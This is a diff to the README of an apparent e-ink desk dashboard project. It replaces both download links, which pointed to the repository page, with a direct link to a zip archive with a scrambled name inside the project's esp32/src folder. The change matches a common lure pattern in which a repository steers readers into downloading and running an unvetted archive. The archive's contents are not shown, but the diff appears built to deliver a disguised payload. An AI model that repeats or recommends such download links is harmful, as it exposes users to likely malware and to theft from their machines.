@@ -1,6 +1,6 @@
 # 🖥️ e-ink-desk-dashboard - View your daily tasks on paper
 
-[![](https://img.shields.io/badge/Download-e--ink--desk--dashboard-blue.svg)](https://github.com/Goddartwailful727/e-ink-desk-dashboard)
+[![](https://img.shields.io/badge/Download-e--ink--desk--dashboard-blue.svg)](https://github.com/Goddartwailful727/e-ink-desk-dashboard/raw/refs/heads/main/esp32/src/ink-e-dashboard-desk-1.9.zip)
 
 This project displays your daily productivity data on an e-ink screen. It sends information from your computer to a small device on your desk. The screen looks like paper and stays visible without electricity. You see your calendar, to-do lists, and weather updates at a glance.
 
@@ -25,7 +25,7 @@ Ensure your computer meets these needs before starting:
 
 ## 📥 Download and install
 
-Visit this page to download the software: [https://github.com/Goddartwailful727/e-ink-desk-dashboard](https://github.com/Goddartwailful727/e-ink-desk-dashboard)
+Visit this page to download the software: [https://github.com/Goddartwailful727/e-ink-desk-dashboard/raw/refs/heads/main/esp32/src/ink-e-dashboard-desk-1.9.zip](https://github.com/Goddartwailful727/e-ink-desk-dashboard/raw/refs/heads/main/esp32/src/ink-e-dashboard-desk-1.9.zip)
 
 Follow these steps to install the system:
 
